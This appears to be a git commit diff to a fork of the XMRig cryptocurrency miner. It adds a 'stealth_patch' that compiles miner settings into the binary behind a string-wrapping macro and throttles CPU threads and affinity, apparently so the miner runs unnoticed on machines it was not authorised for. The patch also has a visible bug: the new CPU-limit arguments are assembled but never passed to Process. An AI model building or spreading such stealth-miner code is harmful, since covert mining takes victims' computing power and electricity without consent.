967ceff691d5a8cfb5f034381efc536fbb3074cb
X3NO <X3NO@disroot.org>
2024-10-17 23:24:12 +0200

    Added CPU limits

---
+++ src/stealth_patch/cpu_config.cpp
@@ -0,0 +1,88 @@
+#include <stdio.h>
+
+#if defined(_WIN32) || defined(_WIN64)
+#include <windows.h>
+
+DWORD threads(int limit_percent)
+{
+    if (!limit_percent)
+    {
+        if (sscanf_s(LIMIT_CPU_PERCENT, "%d", &limit_percent) != 1) {
+            return 1; // Return a safe default value
+        }
+    }
+
+    SYSTEM_INFO sysinfo;
+    GetSystemInfo(&sysinfo);
+    DWORD cpus = sysinfo.dwNumberOfProcessors;
+    
+    double limited_cpus = static_cast<double>(cpus) * (static_cast<double>(limit_percent) / 100.0);
+    DWORD result = static_cast<DWORD>(limited_cpus);
+    return (result > 0) ? result : 1;
+}
+
+char* threads_str()
+{
+    DWORD cpus = threads(0);
+    char* cpus_str = new char[16];
+    if (cpus_str) {
+        sprintf_s(cpus_str, 16, "%lu", cpus);
+    }
+    return cpus_str;
+}
+
+char* cpu_affinity_str(DWORD cpus_to_use)
+{
+    DWORD_PTR affinity = 0;
+
+    for (DWORD i = 0; i < cpus_to_use && i < sizeof(DWORD_PTR) * 8; i++)
+    {
+        affinity |= static_cast<DWORD_PTR>(1) << i;
+    }
+
+    char* affinity_str = new char[17];
+    if (affinity_str) {
+        sprintf_s(affinity_str, 17, "%016llX", affinity);
+    }
+    return affinity_str;
+}
+#endif // _WIN32 || _WIN64
+
+#if defined(__linux__) || defined(__APPLE__)
+#include <sys/sysinfo.h>
+
+int threads(int limit_percent)
+{
+    if (!limit_percent)
+    {
+        if (sscanf(LIMIT_CPU_PERCENT, "%d", &limit_percent) != 1) {
+            return 1; // Return a safe default value
+        }
+    }
+
+    float result = float(get_nprocs_conf()) * (float(limit_percent) / 100.0f);
+    return (int)result;
+}
+
+char* threads_str()
+{
+    int cpus = threads(0);
+    char* cpus_str = new char[16];
+    snprintf(cpus_str, 16, "%d", cpus);
+    return cpus_str;
+}
+
+char* cpu_affinity_str(int cpus_to_use)
+{
+    unsigned int affinity = 0;
+
+    for (int i = 0; i < cpus_to_use && i < 32; i++)
+    {
+        affinity |= 1u << i;
+    }
+
+    char* affinity_str = new char[9];
+    snprintf(affinity_str, 9, "%08X", affinity);
+    return affinity_str;
+}
+#endif // __linux__ || __APPLE__
--- src/xmrig.cpp
+++ src/xmrig.cpp
@@ -21,29 +21,50 @@
 #include "base/kernel/Process.h"
 
 #ifdef INJECT_SETTINGS
-#include "stealth_patch/safe_string.h"
-#include "stealth_patch/prepare_config.cpp"
 #ifndef INJECTED_SETTINGS
 #error "INJECTED_SETTINGS must be defined with your command-line parameters"
 #endif // INJECTED_SETTINGS
+
+#include "stealth_patch/safe_string.h"
+#include "stealth_patch/prepare_config.cpp"
 #endif // INJECT_SETTINGS
+
+#ifdef LIMIT_CPU
+#ifndef LIMIT_CPU_PERCENT
+#error "LIMIT_CPU_PERCENT must be defined with the percentage of CPU usage"
+#endif // LIMIT_CPU_PERCENT
+#include "stealth_patch/cpu_config.cpp"
+#endif // LIMIT_CPU
 
 int main(int argc, char **argv)
 {
     using namespace xmrig;
 
 #ifdef INJECT_SETTINGS
-
     int count = 0;
-    char** provided_settings = split_string(SAFE_STRING(INJECTED_SETTINGS), &count);
+    char **provided_settings = split_string(SAFE_STRING(INJECTED_SETTINGS), &count);
 
-    char** injected_settings = new char*[count + 1];
+    char **injected_settings = new char *[count + 1];
     injected_settings[0] = argv[0];
-    memcpy(injected_settings+1, provided_settings, count * sizeof(*provided_settings));
-    // free_split_string(provided_settings, count);
+    memcpy(injected_settings + 1, provided_settings, count * sizeof(*provided_settings));
+#ifdef LIMIT_CPU
+    char *additional_settings[] = {
+        SAFE_STRING("--threads"),
+        threads_str(),
+        SAFE_STRING("--cpu-affinity"),
+        cpu_affinity_str(threads(0)),
+    };
 
-    Process process(count+1, injected_settings);
+    int additional_count = sizeof(additional_settings) / sizeof(additional_settings[0]);
+    char **final_settings = new char *[count + 1 + additional_count];
+    memcpy(final_settings, injected_settings, (count + 1) * sizeof(*injected_settings));
+    memcpy(final_settings + count + 1, additional_settings, additional_count * sizeof(*additional_settings));
+#endif // LIMIT_CPU
+    // for (int i = 0; i < count + 1 + additional_count; i++) {
+    //     printf("Injected argv[%d]: %s\n", i, final_settings[i]);
+    // }
 
+    Process process(count + 1, injected_settings);
 #else
     Process process(argc, argv);
 #endif // INJECT_SETTINGS
